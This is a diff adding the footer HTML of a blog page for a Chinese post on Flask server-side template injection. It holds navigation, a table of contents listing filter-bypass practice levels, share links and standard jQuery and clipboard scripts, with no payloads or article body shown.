+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">مشاريع</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">SSTI 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%A1%E6%9D%BF%E4%BB%A5%E5%8F%8A%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-number">2.</span> <span class="toc-text">什么是模板以及模板引擎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask%E5%9F%BA%E7%A1%80"><span class="toc-number">3.</span> <span class="toc-text">Flask基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93"><span class="toc-number">4.</span> <span class="toc-text">模板渲染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask-SSTI"><span class="toc-number">5.</span> <span class="toc-text">Flask SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BA%A7%E7%94%9F-SSTI"><span class="toc-number">6.</span> <span class="toc-text">为什么产生 SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">SSTI漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E5%92%8C%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7"><span class="toc-number">8.</span> <span class="toc-text">魔法方法和内置属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#builtins"><span class="toc-number">8.0.1.</span> <span class="toc-text">__builtins__</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sys"><span class="toc-number">8.0.2.</span> <span class="toc-text">sys</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#import"><span class="toc-number">8.0.3.</span> <span class="toc-text">__import__</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-number">9.</span> <span class="toc-text">练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-1-no-waf"><span class="toc-number">9.1.</span> <span class="toc-text">Level  1 no waf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">9.2.</span> <span class="toc-text">拓展</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-2-bypass"><span class="toc-number">9.3.</span> <span class="toc-text">Level 2 bypass {{</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95-1"><span class="toc-number">9.3.1.</span> <span class="toc-text">拓展</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-3"><span class="toc-number">9.4.</span> <span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-4-bypass"><span class="toc-number">9.5.</span> <span class="toc-text">Level 4 bypass [  ]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-5-bypass-%E2%80%98-%E2%80%9C"><span class="toc-number">9.6.</span> <span class="toc-text">Level 5 bypass  ‘   “</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95-2"><span class="toc-number">9.6.1.</span> <span class="toc-text">拓展</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-6-bypass"><span class="toc-number">9.7.</span> <span class="toc-text">Level 6 bypass _</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">9.7.1.</span> <span class="toc-text">关于过滤器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95-3"><span class="toc-number">9.7.2.</span> <span class="toc-text">拓展</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-7-bypass"><span class="toc-number">9.8.</span> <span class="toc-text">Level 7 bypass .</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-8-bypass-keywords"><span class="toc-number">9.9.</span> <span class="toc-text">Level 8 bypass keywords</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95-4"><span class="toc-number">9.9.1.</span> <span class="toc-text">拓展</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-9-bypass-number"><span class="toc-number">9.10.</span> <span class="toc-text">Level 9 bypass number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-10"><span class="toc-number">9.11.</span> <span class="toc-text">Level 10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-11-bypass-combination1"><span class="toc-number">9.12.</span> <span class="toc-text">Level 11 bypass combination1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC"><span class="toc-number">9.12.1.</span> <span class="toc-text">绕过空格</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-12-bypass-combination2"><span class="toc-number">9.13.</span> <span class="toc-text">Level 12 bypass combination2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-13-bypass-combination3"><span class="toc-number">9.14.</span> <span class="toc-text">Level 13 bypass combination3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">10.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">11.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&text=FLASK SSTI"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&title=FLASK SSTI"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&is_video=false&description=FLASK SSTI"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=FLASK SSTI&body=Check out this article: http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&title=FLASK SSTI"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&title=FLASK SSTI"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&title=FLASK SSTI"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&title=FLASK SSTI"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&name=FLASK SSTI&description=&lt;p&gt;这是我在先知社区的第一篇的文章,希望能对各位师傅有所帮助.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/10394&#34;&gt;Falsk ssti&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://n0el4kls.github.io/2021/10/26/2021-10-26-flaskssti/&t=FLASK SSTI"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    Noel
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">مشاريع</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
